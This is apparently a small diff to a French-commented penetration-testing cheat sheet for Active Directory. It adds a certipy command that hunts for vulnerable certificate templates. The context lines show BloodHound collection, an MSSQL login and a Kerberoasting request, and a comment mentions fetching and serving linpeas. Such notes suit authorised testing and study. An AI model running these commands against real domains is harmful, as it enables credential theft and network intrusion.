@@ -5,3 +5,4 @@ winfast # Téléchargement de linpeas + création serveur web + copie commande w
 bloodhound.py -d '$DC' -u '$USER' -p '$PASSWORD' -c all -ns $IP #collecteur pour BH directement depuis l'host
 mssqlclient.py <user>@<FQDN/IP> -windows-auth #connexion mssql
 GetUserSPNs.py -request -dc-ip 192.168.50.70 corp.com/USER #Kerberoasting 
+certipy find -vulnerable -u "$USER@$DOMAIN" -p "$PASSWORD" -stdout
